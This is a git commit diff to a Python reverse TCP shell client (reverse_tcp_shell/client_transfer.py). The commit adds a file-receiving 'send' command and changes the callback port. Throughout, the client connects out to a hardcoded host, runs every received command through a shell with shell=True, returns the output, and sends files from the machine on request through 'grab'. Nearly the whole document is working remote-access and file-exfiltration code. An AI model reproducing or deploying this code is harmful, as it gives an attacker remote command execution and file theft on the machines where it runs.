9bb07a4f20e09d0f20ca37f222d84234d445a7d8
ilya <misyurailya5@gmail.com>
2022-07-08 13:05:32 +0300

    client

--- reverse_tcp_shell/client_transfer.py
+++ reverse_tcp_shell/client_transfer.py
@@ -5,6 +5,7 @@ import os
 
 def transfer(s, path):
     if os.path.exists(path):
+        print('here')
         f = open(path, 'rb')
         packet = f.read(1024)
         while len(packet) > 0:
@@ -14,10 +15,27 @@ def transfer(s, path):
     else:
         s.send('File not found'.encode())
 
+def download(conn, command):
+    # send path
+    f = open('C:\\Users\\User\\Desktop\\' + command, 'wb')
+    print(f)
+    while True:
+        bits = conn.recv(1024)
+        if bits.endswith('DONE'.encode()):
+            print('here')
+            f.write(bits[:-4])
+            f.close()
+            print('[+] Transfer completed ')
+            break
+        if 'File not found'.encode() in bits:
+            print('[-] Unable to find out the file')
+            break
+        f.write(bits)
+        print('here')
 
 def connecting():
     s = socket.socket()
-    s.connect(("192.168.1.24", 4448))
+    s.connect(("192.168.1.24", 4445))
 
     while True:
         command = s.recv(1024)
@@ -28,15 +46,22 @@ def connecting():
 
         elif 'grab' in command.decode():
             grab, path = command.decode().split("*")
+            print("here1")
             try:
                 transfer(s, path)
             except:
                 pass
+
+        elif 'send' in command.decode():
+            send, path = command.decode().split("*")
+            download(s, path)
+
+
         else:
             CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
             s.send(CMD.stderr.read())
-        s.send(CMD.stdout.read())
+            s.send(CMD.stdout.read())
 
 
 def main():
